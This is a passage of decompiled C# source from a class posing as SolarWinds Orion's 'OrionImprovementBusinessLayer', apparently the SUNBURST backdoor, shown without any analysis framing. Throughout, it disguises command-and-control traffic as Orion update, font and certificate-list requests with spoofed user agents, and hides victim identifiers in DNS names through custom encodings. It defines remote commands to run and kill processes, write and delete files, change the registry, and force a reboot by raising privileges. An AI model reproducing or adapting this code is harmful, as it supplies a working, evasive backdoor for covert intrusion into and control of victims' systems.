						httpWebRequest.ContentType = "application/octet-stream";
					}
					return this.CreateUploadRequestImpl(httpWebRequest, array, out outData);
				}
				catch (Exception)
				{
				}
				return (HttpStatusCode)0;
			}

			private int[] GetIntArray(int sz)
			{
				int[] array = new int[30];
				int num = sz;
				for (int i = array.Length - 1; i >= 0; i--)
				{
					if (num < 16 || i == 0)
					{
						array[i] = num;
						return array;
					}
					int num2 = num / (i + 1) + 1;
					if (num2 < 16)
					{
						array[i] = this.random.Next(16, Math.Min(32, num) + 1);
						num -= array[i];
					}
					else
					{
						int num3 = Math.Min(512 - num2, num2 - 16);
						array[i] = this.random.Next(num2 - num3, num2 + num3 + 1);
						num -= array[i];
					}
				}
				return array;
			}

			private bool Valid(int percent)
			{
				return this.random.Next(100) < percent;
			}

			private string GetBaseUri(OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method, int err)
			{
				int num;
				if (method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get)
				{
					if (method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
					{
						num = 1;
						goto IL_0E;
					}
				}
				num = 16;
				IL_0E:
				int num2 = num;
				string baseUriImpl;
				ulong hash;
				for (;;)
				{
					baseUriImpl = this.GetBaseUriImpl(method, err);
					hash = OrionImprovementBusinessLayer.GetHash(baseUriImpl);
					if (!this.UriTimeStamps.Contains(hash))
					{
						break;
					}
					if (--num2 <= 0)
					{
						return baseUriImpl;
					}
				}
				this.UriTimeStamps.Add(hash);
				return baseUriImpl;
			}

			private string GetBaseUriImpl(OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method, int err)
			{
				string text = null;
				if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
				{
					text = ((ushort)err).ToString();
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
				{
					string[] array = new string[]
					{
						"-root",
						"-cert",
						"-universal_ca",
						"-ca",
						"-primary_ca",
						"-timestamp",
						"",
						"-global",
						"-secureca"
					};
					return string.Format("pki/crl/{0}{1}{2}.crl", this.random.Next(100, 10000), array[this.random.Next(array.Length)], (text == null) ? "" : ("-" + text));
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put)
				{
					string[] array2 = new string[]
					{
						"Bold",
						"BoldItalic",
						"ExtraBold",
						"ExtraBoldItalic",
						"Italic",
						"Light",
						"LightItalic",
						"Regular",
						"SemiBold",
						"SemiBoldItalic"
					};
					string[] array3 = new string[]
					{
						"opensans",
						"noto",
						"freefont",
						"SourceCodePro",
						"SourceSerifPro",
						"SourceHanSans",
						"SourceHanSerif"
					};
					int num = this.random.Next(array3.Length);
					if (num <= 1)
					{
						return string.Format("fonts/woff/{0}-{1}-{2}-webfont{3}.woff2", new object[]
						{
							this.random.Next(100, 10000),
							array3[num],
							array2[this.random.Next(array2.Length)].ToLower(),
							text
						});
					}
					return string.Format("fonts/woff/{0}-{1}-{2}{3}.woff2", new object[]
					{
						this.random.Next(100, 10000),
						array3[num],
						array2[this.random.Next(array2.Length)],
						text
					});
				}
				else
				{
					if (method <= OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
					{
						string text2 = "";
						if (this.Valid(20))
						{
							text2 += "SolarWinds";
							if (this.Valid(40))
							{
								text2 += ".CortexPlugin";
							}
						}
						if (this.Valid(80))
						{
							text2 += ".Orion";
						}
						if (this.Valid(80))
						{
							string[] array4 = new string[]
							{
								"Wireless",
								"UI",
								"Widgets",
								"NPM",
								"Apollo",
								"CloudMonitoring"
							};
							text2 = text2 + "." + array4[this.random.Next(array4.Length)];
						}
						if (this.Valid(30) || string.IsNullOrEmpty(text2))
						{
							string[] array5 = new string[]
							{
								"Nodes",
								"Volumes",
								"Interfaces",
								"Components"
							};
							text2 = text2 + "." + array5[this.random.Next(array5.Length)];
						}
						if (this.Valid(30) || text != null)
						{
							text2 = string.Concat(new object[]
							{
								text2,
								"-",
								this.random.Next(1, 20),
								".",
								this.random.Next(1, 30)
							});
							if (text != null)
							{
								text2 = text2 + "." + ((ushort)err).ToString();
							}
						}
						return "swip/upd/" + text2.TrimStart(new char[]
						{
							'.'
						}) + ".xml";
					}
					if (method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put)
					{
						return "swip/Upload.ashx";
					}
					return "swip/Events";
				}
			}

			private string GetUserAgent()
			{
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get)
				{
					return null;
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
				{
					if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentDefault))
					{
						OrionImprovementBusinessLayer.userAgentDefault = "Microsoft-CryptoAPI/";
						OrionImprovementBusinessLayer.userAgentDefault += OrionImprovementBusinessLayer.GetOSVersion(false);
					}
					return OrionImprovementBusinessLayer.userAgentDefault;
				}
				if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentOrionImprovementClient))
				{
					OrionImprovementBusinessLayer.userAgentOrionImprovementClient = "SolarWindsOrionImprovementClient/";
					try
					{
						string text = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
						text += "\\OrionImprovement\\SolarWinds.OrionImprovement.exe";
						OrionImprovementBusinessLayer.userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(text).FileVersion;
					}
					catch (Exception)
					{
						OrionImprovementBusinessLayer.userAgentOrionImprovementClient += "3.0.0.382";
					}
				}
				return OrionImprovementBusinessLayer.userAgentOrionImprovementClient;
			}

			private readonly Random random = new Random();

			private readonly byte[] customerId;

			private readonly string httpHost;

			private readonly OrionImprovementBusinessLayer.HttpOipMethods requestMethod;

			private bool isAbort;

			private int delay;

			private int delayInc;

			private readonly OrionImprovementBusinessLayer.Proxy proxy;

			private DateTime timeStamp = DateTime.Now;

			private int mIndex;

			private Guid sessionId = Guid.NewGuid();

			private readonly List<ulong> UriTimeStamps = new List<ulong>();

			private enum JobEngine
			{
				Idle,
				Exit,
				SetTime,
				CollectSystemDescription,
				UploadSystemDescription,
				RunTask,
				GetProcessByDescription,
				KillTask,
				GetFileSystemEntries,
				WriteFile,
				FileExists,
				DeleteFile,
				GetFileHash,
				ReadRegistryValue,
				SetRegistryValue,
				DeleteRegistryValue,
				GetRegistrySubKeyAndValueNames,
				Reboot,
				None
			}

			private enum HttpOipExMethods
			{
				Get,
				Head,
				Put,
				Post
			}
		}

		private static class DnsHelper
		{
			public static bool CheckServerConnection(string hostName)
			{
				try
				{
					IPHostEntry iphostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry != null)
					{
						IPAddress[] addressList = iphostEntry.AddressList;
						for (int i = 0; i < addressList.Length; i++)
						{
							OrionImprovementBusinessLayer.AddressFamilyEx addressFamily = OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(addressList[i]);
							if (addressFamily != OrionImprovementBusinessLayer.AddressFamilyEx.Error && addressFamily != OrionImprovementBusinessLayer.AddressFamilyEx.Atm)
							{
								return true;
							}
						}
					}
				}
				catch (Exception)
				{
				}
				return false;
			}

			public static IPHostEntry GetIPHostEntry(string hostName)
			{
				int[][] array = new int[][]
				{
					new int[]
					{
						25,
						30
					},
					new int[]
					{
						55,
						60
					}
				};
				int num = array.GetLength(0) + 1;
				for (int i = 1; i <= num; i++)
				{
					try
					{
						return Dns.GetHostEntry(hostName);
					}
					catch (SocketException)
					{
					}
					if (i + 1 <= num)
					{
						OrionImprovementBusinessLayer.DelayMs((double)(array[i - 1][0] * 1000), (double)(array[i - 1][1] * 1000));
					}
				}
				return null;
			}

			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(string hostName, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				rec.cname = null;
				try
				{
					IPHostEntry iphostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry == null)
					{
						return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
					}
					IPAddress[] addressList = iphostEntry.AddressList;
					int i = 0;
					while (i < addressList.Length)
					{
						IPAddress ipaddress = addressList[i];
						if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
						{
							if (!(iphostEntry.HostName != hostName) || string.IsNullOrEmpty(iphostEntry.HostName))
							{
								OrionImprovementBusinessLayer.IPAddressesHelper.GetAddresses(ipaddress, rec);
								return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(ipaddress, out rec.dnssec);
							}
							rec.cname = iphostEntry.HostName;
							if (OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(ipaddress) == OrionImprovementBusinessLayer.AddressFamilyEx.Atm)
							{
								return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
							}
							if (rec.dnssec)
							{
								rec.dnssec = false;
								return OrionImprovementBusinessLayer.AddressFamilyEx.NetBios;
							}
							return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
						}
						else
						{
							i++;
						}
					}
					return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
			}
		}

		private class CryptoHelper
		{
			public CryptoHelper(byte[] userId, string domain)
			{
				this.guid = userId.ToArray<byte>();
				this.dnStr = OrionImprovementBusinessLayer.CryptoHelper.DecryptShort(domain);
				this.offset = 0;
				this.nCount = 0;
			}

			private static string Base64Decode(string s)
			{
				string text = "rq3gsalt6u1iyfzop572d49bnx8cvmkewhj";
				string text2 = "0_-.";
				string text3 = "";
				Random random = new Random();
				foreach (char value in s)
				{
					int num = text2.IndexOf(value);
					text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length].ToString()) : (text3 + text2[0].ToString() + text[num + random.Next() % (text.Length / text2.Length) * text2.Length].ToString()));
				}
				return text3;
			}

			private static string Base64Encode(byte[] bytes, bool rt)
			{
				string text = "ph2eifo3n5utg1j8d94qrvbmk0sal76c";
				string text2 = "";
				uint num = 0U;
				int i = 0;
				foreach (byte b in bytes)
				{
					num |= (uint)((uint)b << i);
					for (i += 8; i >= 5; i -= 5)
					{
						text2 += text[(int)(num & 31U)].ToString();
						num >>= 5;
					}
				}
				if (i > 0)
				{
					if (rt)
					{
						num |= (uint)((uint)new Random().Next() << i);
					}
					text2 += text[(int)(num & 31U)].ToString();
				}
				return text2;
			}

			private static string CreateSecureString(byte[] data, bool flag)
			{
				byte[] array = new byte[data.Length + 1];
				array[0] = (byte)new Random().Next(1, 127);
				if (flag)
				{
					byte[] array2 = array;
					int num = 0;
					array2[num] |= 128;
				}
				for (int i = 1; i < array.Length; i++)
				{
					array[i] = (data[i - 1] ^ array[0]);
				}
				return OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(array, true);
			}

			private static string CreateString(int n, char c)
			{
				if (n < 0 || n >= 36)
				{
					n = 35;
				}
				n = (n + (int)c) % 36;
				if (n < 10)
				{
					return ((char)(48 + n)).ToString();
				}
				return ((char)(97 + n - 10)).ToString();
			}

			private static string DecryptShort(string domain)
			{
				if (domain.All((char c) => "0123456789abcdefghijklmnopqrstuvwxyz-_.".Contains(c)))
				{
					return OrionImprovementBusinessLayer.CryptoHelper.Base64Decode(domain);
				}
				return "00" + OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
			}

			private string GetStatus()
			{
				return string.Concat(new string[]
				{
					".",
					OrionImprovementBusinessLayer.domain2,
					".",
					OrionImprovementBusinessLayer.domain3[(int)this.guid[0] % OrionImprovementBusinessLayer.domain3.Length],
					".",
					OrionImprovementBusinessLayer.domain1
				});
			}

			private static int GetStringHash(bool flag)
			{
				return ((int)((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 524287) << 1 | (flag ? 1 : 0);
			}

			private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
			{
				byte[] array = new byte[this.guid.Length + ((data != null) ? data.Length : 0) + 3];
				Array.Clear(array, 0, array.Length);
				Array.Copy(this.guid, array, this.guid.Length);
				int stringHash = OrionImprovementBusinessLayer.CryptoHelper.GetStringHash(flag);
				array[this.guid.Length] = (byte)((stringHash & 983040) >> 16 | (sz & 15) << 4);
				array[this.guid.Length + 1] = (byte)((stringHash & 65280) >> 8);
				array[this.guid.Length + 2] = (byte)(stringHash & 255);
				if (data != null)
				{
					Array.Copy(data, 0, array, array.Length - data.Length, data.Length);
				}
				for (int i = 0; i < this.guid.Length; i++)
				{
					byte[] array2 = array;
					int num = i;
					array2[num] ^= array[this.guid.Length + 2 - i % 2];
				}
				return array;
			}

			public string GetNextStringEx(bool flag)
			{
				byte[] array = new byte[(OrionImprovementBusinessLayer.svcList.Length * 2 + 7) / 8];
				Array.Clear(array, 0, array.Length);
				for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
				{
					int num = Convert.ToInt32(OrionImprovementBusinessLayer.svcList[i].stopped) | Convert.ToInt32(OrionImprovementBusinessLayer.svcList[i].running) << 1;
					byte[] array2 = array;
					int num2 = array.Length - 1 - i / 4;
					array2[num2] |= Convert.ToByte(num << i % 4 * 2);
				}
				return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(2, array, flag), false) + this.GetStatus();
			}

			public string GetNextString(bool flag)
			{
				return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(1, null, flag), false) + this.GetStatus();
			}

			public string GetPreviousString(out bool last)
			{
				string text = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
				int num = 32 - text.Length - 1;
				string result = "";
				last = false;
				if (this.offset < this.dnStr.Length && this.nCount <= 36)
				{
					int num2 = Math.Min(num, this.dnStr.Length - this.offset);
					this.dnStrLower = this.dnStr.Substring(this.offset, num2);
					this.offset += num2;
					if ("-_0".Contains(this.dnStrLower[this.dnStrLower.Length - 1]))
					{
						if (num2 == num)
						{
							this.offset--;
							this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
						}
						this.dnStrLower += "0";
					}
					if (this.offset >= this.dnStr.Length || this.nCount > 36)
					{
						this.nCount = -1;
					}
					result = text + OrionImprovementBusinessLayer.CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
					if (this.nCount >= 0)
					{
						this.nCount++;
					}
					last = (this.nCount < 0);
					return result;
				}
				return result;
			}

			public string GetCurrentString()
			{
				string text = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
				return text + OrionImprovementBusinessLayer.CryptoHelper.CreateString((this.nCount > 0) ? (this.nCount - 1) : this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
			}

			private const int dnSize = 32;

			private const int dnCount = 36;

			private readonly byte[] guid;

			private readonly string dnStr;

			private string dnStrLower;

			private int nCount;

			private int offset;
		}

		private class DnsRecords
		{
			public DnsRecords()
			{
			}

			public int A;

			public int _type;

			public int length;

			public string cname;

			public bool dnssec;
		}

		private class IPAddressesHelper
		{
			public IPAddressesHelper(string subnet, string mask, OrionImprovementBusinessLayer.AddressFamilyEx family, bool ext)
			{
				this.family = family;
				this.subnet = IPAddress.Parse(subnet);
				this.mask = IPAddress.Parse(mask);
				this.ext = ext;
			}

			public IPAddressesHelper(string subnet, string mask, OrionImprovementBusinessLayer.AddressFamilyEx family) : this(subnet, mask, family, false)
			{
			}

			public static void GetAddresses(IPAddress address, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				Random random = new Random();
				byte[] addressBytes = address.GetAddressBytes();
				int num = (int)(addressBytes[(int)((long)addressBytes.Length) - 2] & 10);
				if (num != 2)
				{
					if (num != 8)
					{
						if (num != 10)
						{
							rec.length = 0;
						}
						else
						{
							rec.length = 3;
						}
					}
					else
					{
						rec.length = 2;
					}
				}
				else
				{
					rec.length = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 136);
				if (num != 8)
				{
					if (num != 128)
					{
						if (num != 136)
						{
							rec._type = 0;
						}
						else
						{
							rec._type = 3;
						}
					}
					else
					{
						rec._type = 2;
					}
				}
				else
				{
					rec._type = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 84);
				if (num <= 20)
				{
					if (num == 4)
					{
						rec.A = random.Next(240, 300);
						return;
					}
					if (num == 16)
					{
						rec.A = random.Next(480, 600);
						return;
					}
					if (num == 20)
					{
						rec.A = random.Next(1440, 1560);
						return;
					}
				}
				else if (num <= 68)
				{
					if (num == 64)
					{
						rec.A = random.Next(4320, 5760);
						return;
					}
					if (num == 68)
					{
						rec.A = random.Next(10020, 10140);
						return;
					}
				}
				else
				{
					if (num == 80)
					{
						rec.A = random.Next(20100, 20220);
						return;
					}
					if (num == 84)
					{
						rec.A = random.Next(43140, 43260);
						return;
					}
				}
				rec.A = 0;
			}

			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(IPAddress address)
			{
				bool flag;
				return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address, out flag);
			}

			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(IPAddress address, out bool ext)
			{
				ext = false;
				try
				{
					if (!IPAddress.IsLoopback(address) && !address.Equals(IPAddress.Any) && !address.Equals(IPAddress.IPv6Any))
					{
						if (address.AddressFamily == AddressFamily.InterNetworkV6)
						{
							byte[] addressBytes = address.GetAddressBytes();
							if (addressBytes.Take(10).All((byte b) => b == 0) && addressBytes[10] == addressBytes[11] && (addressBytes[10] == 0 || addressBytes[10] == 255))
							{
								address = address.MapToIPv4();
							}
						}
						else if (address.AddressFamily != AddressFamily.InterNetwork)
						{
							return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
						}
						byte[] addressBytes2 = address.GetAddressBytes();
						foreach (OrionImprovementBusinessLayer.IPAddressesHelper ipaddressesHelper in OrionImprovementBusinessLayer.nList)
						{
							byte[] addressBytes3 = ipaddressesHelper.subnet.GetAddressBytes();
							byte[] addressBytes4 = ipaddressesHelper.mask.GetAddressBytes();
							if (addressBytes2.Length == addressBytes4.Length && addressBytes2.Length == addressBytes3.Length)
							{
								bool flag = true;
								int j = 0;
								while (j < addressBytes2.Length)
								{
									if ((addressBytes2[j] & addressBytes4[j]) != (addressBytes3[j] & addressBytes4[j]))
									{
										flag = false;
										IL_11B:
										if (!flag)
										{
											goto IL_11F;
										}
										ext = ipaddressesHelper.ext;
										return ipaddressesHelper.family;
									}
									else
									{
										j++;
									}
								}
								goto IL_11B;
							}
							IL_11F:;
						}
						return (address.AddressFamily == AddressFamily.InterNetworkV6) ? OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6 : OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork;
					}
					return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
			}

			private readonly IPAddress subnet;

			private readonly IPAddress mask;

			private readonly OrionImprovementBusinessLayer.AddressFamilyEx family;

			private readonly bool ext;
		}

		private static class ZipHelper
		{
			public static byte[] Compress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream2, CompressionMode.Compress))
						{
							memoryStream.CopyTo(deflateStream);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			public static byte[] Decompress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
						{
							deflateStream.CopyTo(memoryStream2);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			public static string Zip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					result = Convert.ToBase64String(OrionImprovementBusinessLayer.ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
				}
				catch (Exception)
				{
					result = "";
				}
				return result;
			}

			public static string Unzip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					byte[] bytes = OrionImprovementBusinessLayer.ZipHelper.Decompress(Convert.FromBase64String(input));
					result = Encoding.UTF8.GetString(bytes);
				}
				catch (Exception)
				{
					result = input;
				}
				return result;
			}
		}

		public class NativeMethods
		{
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool CloseHandle(IntPtr handle);

			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] [In] bool DisableAllPrivileges, [In] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In] [Out] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState, [In] [Out] ref uint ReturnLength);

			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool LookupPrivilegeValueW([In] string lpSystemName, [In] string lpName, [In] [Out] ref OrionImprovementBusinessLayer.NativeMethods.LUID Luid);

			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr GetCurrentProcess();

			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In] [Out] ref IntPtr TokenHandle);

			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool InitiateSystemShutdownExW([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [MarshalAs(UnmanagedType.Bool)] [In] bool bForceAppsClosed, [MarshalAs(UnmanagedType.Bool)] [In] bool bRebootAfterShutdown, [In] uint dwReason);

			public static bool RebootComputer()
			{
				bool flag = false;
				bool result;
				try
				{
					bool newState = false;
					string privilege = "SeShutdownPrivilege";
					if (!OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out newState))
					{
						result = flag;
					}
					else
					{
						flag = OrionImprovementBusinessLayer.NativeMethods.InitiateSystemShutdownExW(null, null, 0U, true, true, 2147745794U);
						OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, newState, out newState);
						result = flag;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
			{
				bool flag = false;
				previousState = false;
				bool result;
				try
				{
					IntPtr zero = IntPtr.Zero;
					OrionImprovementBusinessLayer.NativeMethods.LUID luid = default(OrionImprovementBusinessLayer.NativeMethods.LUID);
					luid.LowPart = 0U;
					luid.HighPart = 0U;
					if (!OrionImprovementBusinessLayer.NativeMethods.OpenProcessToken(OrionImprovementBusinessLayer.NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
					{
						result = false;
					}
					else if (!OrionImprovementBusinessLayer.NativeMethods.LookupPrivilegeValueW(null, privilege, ref luid))
					{
						OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
						result = false;
					}
					else
					{
						OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE = default(OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE);
						OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE2 = default(OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE);
						token_PRIVILEGE.PrivilegeCount = 1U;
						token_PRIVILEGE.Privilege.Luid = luid;
						token_PRIVILEGE.Privilege.Attributes = (newState ? 2U : 0U);
						uint num = 0U;
						OrionImprovementBusinessLayer.NativeMethods.AdjustTokenPrivileges(zero, false, ref token_PRIVILEGE, (uint)Marshal.SizeOf(token_PRIVILEGE2), ref token_PRIVILEGE2, ref num);
						previousState = ((token_PRIVILEGE2.Privilege.Attributes & 2U) > 0U);
						flag = true;
						OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
						result = true;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			public NativeMethods()
			{
			}

			private const uint SE_PRIVILEGE_DISABLED = 0U;

			private const uint SE_PRIVILEGE_ENABLED = 2U;

			private const string ADVAPI32 = "advapi32.dll";

			private const string KERNEL32 = "kernel32.dll";

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID
			{
				public uint LowPart;

				public uint HighPart;
			}

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID_AND_ATTRIBUTES
			{
				public OrionImprovementBusinessLayer.NativeMethods.LUID Luid;

				public uint Attributes;
			}

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct TOKEN_PRIVILEGE
			{
				public uint PrivilegeCount;

				public OrionImprovementBusinessLayer.NativeMethods.LUID_AND_ATTRIBUTES Privilege;
			}
		}
	}
}
